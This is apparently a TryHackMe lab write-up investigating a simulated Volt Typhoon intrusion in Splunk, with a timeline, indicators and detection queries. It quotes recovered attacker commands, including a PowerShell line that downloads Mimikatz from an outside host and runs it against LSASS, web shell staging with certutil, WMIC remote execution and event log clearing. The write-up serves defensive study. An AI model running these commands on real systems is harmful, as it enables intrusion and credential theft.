---
layout: post
title: "Volt Typhoon intrusion investigation"
date: 2026-05-14 10:00:00 +0100
categories: [TryHackMe, DFIR]
tags: [splunk, dfir, mitre-attck, powershell, threat-hunting, apt]
description: "Splunk-based reconstruction of a Volt Typhoon-style intrusion using ADSelfService Plus, WMIC, PowerShell, web shells, Mimikatz, netsh proxying and event log cleanup evidence."
---

## Overview

This writeup documents my investigation of the TryHackMe room **Volt Typhoon**, where I played the role of a security analyst retracing a suspected APT intrusion through Splunk logs.

The scenario provided multiple log sources over a two-week period. The goal was to rebuild the attacker timeline, identify the compromised account, follow execution and persistence activity, and extract the key indicators left behind by the attacker.

## Lab context

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Room | Volt Typhoon |
| Focus | Threat hunting, Windows logs, PowerShell, WMIC, credential access |
| Main tools | Splunk, PowerShell log analysis, base64 decoding |
| Threat pattern | Living-off-the-land execution and stealthy persistence |

## Investigation summary

The intrusion began with the takeover of the `dean-admin` account through ADSelfService Plus. After that, the attacker created a new administrator account, used WMIC for reconnaissance and remote command execution, copied sensitive Active Directory and financial data, deployed a web shell for persistence, performed credential access with registry queries and Mimikatz, configured a C2 proxy with `netsh`, and cleared event logs.

## Timeline

| Time | Phase | Evidence |
| --- | --- | --- |
| `2024-03-24T11:10:22` | Initial access | `dean-admin` password changed through ADSelfService Plus |
| `2024-03-25` | Execution | WMIC used for drive enumeration and archive staging |
| `2024-03-28` | Persistence and credential access | Web shell decoded with `certutil`; Mimikatz downloaded through encoded PowerShell |
| `2024-03-29` | Lateral movement, C2 and cleanup | Web shell copied to `server-02`; `netsh portproxy`; event logs cleared |

## Initial access

The room pointed toward ADSelfService Plus, so I searched for password changes linked to the compromised admin account:

```spl
index=* service_name=ADSelfServicePlus username="dean-admin" "password change"
```

This revealed:

| Field | Value |
| --- | --- |
| Account | `dean-admin` |
| Service | `ADSelfServicePlus` |
| Source IP | `192.168.1.134` |
| Access mode | `web_browser` |
| Timestamp | `2024-03-24T11:10:22` |

By reviewing rare username values after the takeover, I identified the new administrator account:

```text
voltyp-admin
```

## Execution through WMIC

Volt Typhoon-style activity commonly uses legitimate Windows tooling. I filtered on the WMIC sourcetype and target server names:

```spl
index="main" sourcetype="wmic" "*server01*" "*server02*"
```

The attacker enumerated local drives:

```cmd
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
```

My first searches for `ntds` did not directly expose the archive password, so I pivoted to compression behavior:

```spl
index="main" sourcetype="wmic" "*7z*"
```

The command exposed the password used to compress the Active Directory database copy:

```cmd
wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"
```

Archive password:

```text
d5ag0nm@5t3r
```

## Persistence

The attacker staged a web shell in a temporary directory:

```powershell
certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
```

It was then copied to an IIS web root on another server:

```powershell
Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"
```

The final web shell name was:

```text
AuditReport.jspx
```

## Defense evasion

The attacker removed RDP history with PowerShell:

```powershell
Remove-ItemProperty
```

They also renamed the archive to look like an image:

```text
cisco-up.7z -> c164.gif
```

Virtualization checks appeared under:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
```

## Credential access

Registry queries targeted software that may store useful credentials:

```text
OpenSSH, putty, realvnc
```

For Mimikatz, the useful pivot was encoded PowerShell. Searching for execution flags and base64 padding revealed the hidden command:

```spl
index="main" "exec" "="
```

Decoded payload:

```powershell
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp","exit") -NoNewWindow -Wait
```

## Discovery, collection and C2

The attacker queried Windows event logs with `wevtutil` and searched for authentication-related event IDs:

```text
4624 4625 4769
```

Financial files were copied from:

```text
C:\ProgramData\FinanceBackup\
```

to:

```text
C:\Windows\Temp\faudit\
```

Files staged:

```text
2022.csv 2023.csv 2024.csv
```

For C2, the attacker configured `netsh portproxy`:

```text
connectaddress=10.2.30.1
connectport=8443
```

## Cleanup

Cleanup activity cleared four logs:

```text
Application Security Setup System
```

The relevant behavior was:

```spl
"wevtutil cl"
```

## Key indicators

| Type | Indicator |
| --- | --- |
| Compromised account | `dean-admin` |
| Created admin account | `voltyp-admin` |
| Initial access timestamp | `2024-03-24T11:10:22` |
| Suspicious IP | `192.168.1.134` |
| Archive password | `d5ag0nm@5t3r` |
| Archive disguise | `c164.gif` |
| Web shell | `AuditReport.jspx` |
| Staging directory | `C:\Windows\Temp\faudit\` |
| C2 address | `10.2.30.1:8443` |
| Mimikatz URL | `http://voltyp.com/3/tlz/mimikatz.exe` |

## Detection ideas

| Behavior | Search idea | Why it matters |
| --- | --- | --- |
| Encoded PowerShell | `sourcetype=powershell ("-enc" OR "-E" OR "FromBase64String")` | Helps identify hidden payloads |
| WMIC remote execution | `sourcetype=wmic "process call create"` | Finds remote command execution |
| Archive staging | `"7z" OR ".7z" OR "-p"` | Can reveal compressed data and archive passwords |
| Web shell copy | `sourcetype=powershell "Copy-Item" ("wwwroot" OR ".aspx" OR ".jspx")` | Useful for IIS persistence hunting |
| Log clearing | `"wevtutil cl"` | Strong cleanup indicator |
| Port proxy | `"netsh" "portproxy" "connectaddress"` | Matches C2 proxy setup behavior |

## Lessons learned

The lab reinforced the need to pivot from exact keywords to attacker behavior. Searching for `ntds` did not immediately reveal the archive password, but searching for compression behavior with `7z` did. The same applied to Mimikatz: the command was hidden behind base64, so encoded PowerShell patterns were more useful than searching only for the tool name.

The full intrusion became clear only when the events were read as a sequence. WMIC, PowerShell, `certutil`, `netsh`, `wevtutil` and registry queries can be legitimate, but their combined usage formed a coherent attack chain.
